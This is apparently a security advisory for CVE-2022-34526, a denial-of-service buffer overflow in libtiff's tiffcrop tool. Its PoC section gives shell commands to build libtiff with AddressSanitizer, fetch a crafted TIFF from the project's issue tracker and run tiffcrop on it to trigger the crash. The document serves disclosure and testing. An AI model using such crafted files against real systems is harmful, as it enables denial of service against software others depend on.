---
description: CVE-2022-34526 Medium severity. A global-memory buffer overflow in the libtiff library leads to denial of service when processing crafted TIFF images with tiffcrop.
title: libtiff tiffcrop buffer overflow DoS
date_published: "2022-11-16"
last_updated: "2022-11-16"
xray_id: XRAY-259933
vul_id: CVE-2022-34526
cvss: 6.5
severity: medium
discovered_by: Nitay Meiron
type: vulnerability
---
## Summary

A global-memory buffer overflow in the libtiff library leads to denial of service when processing crafted TIFF images with tiffcrop.

## Component

[libtiff](http://www.libtiff.org/)

## Affected versions

libtiff (,), no fixed release

## Description

A 4-byte global-memory buffer overflow occurs when `tiffcrop` is run with the `-i` argument against a crafted TIFF file, leading to a crash of `tiffcrop`.

## PoC

Compile libtiff 4.4.0 with ASAN

```
curl https://gitlab.com/libtiff/libtiff/-/archive/v4.4.0/libtiff-v4.4.0.tar.gz -o libtiff-v4.4.0.tar.gz
tar -xf libtiff-v4.4.0.tar.gz
cd libtiff-v4.4.0
CC=gcc CXX=g++ CFLAGS="-ggdb -fsanitize=address" ./configure && make
```

Run the PoC

```
cd tools
curl https://gitlab.com/libtiff/libtiff/uploads/9943030806e03e7d2b8dff5ec0341b6f/poc.zip -o poc.zip
unzip poc.zip
./tiffcrop -i poc.tif a.tif
```



## Vulnerability Mitigations

No vulnerability mitigations are supplied for this issue

## References

[Advisory & PoC exploit](https://gitlab.com/libtiff/libtiff/-/issues/486)